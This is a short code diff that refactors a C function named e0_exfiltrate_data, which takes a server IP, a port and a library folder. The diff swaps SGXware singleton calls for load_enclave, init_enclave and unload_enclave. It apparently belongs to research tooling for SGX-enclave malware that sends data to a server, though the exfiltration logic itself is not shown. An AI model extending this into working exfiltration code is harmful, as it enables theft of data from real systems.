@@ -8,7 +8,7 @@
 
 void e0_exfiltrate_data(char* server_ip, int iport, char* library_folder)
 {
-	if (!SGXware::getInstance()->initUser(server_ip, iport, library_folder))
+	if (!load_enclave() || ! init_enclave(server_ip, library_folder, iport))
 	{
 		printf("\n Can not initialize enclave, exiting ...\n");
 		exit(2);
@@ -39,7 +39,7 @@ void e0_exfiltrate_data(char* server_ip, int iport, char* library_folder)
 	}
 	fclose(pages);
 
-	SGXware::getInstance()->destroyInstance();
+	unload_enclave();
 
 
 }
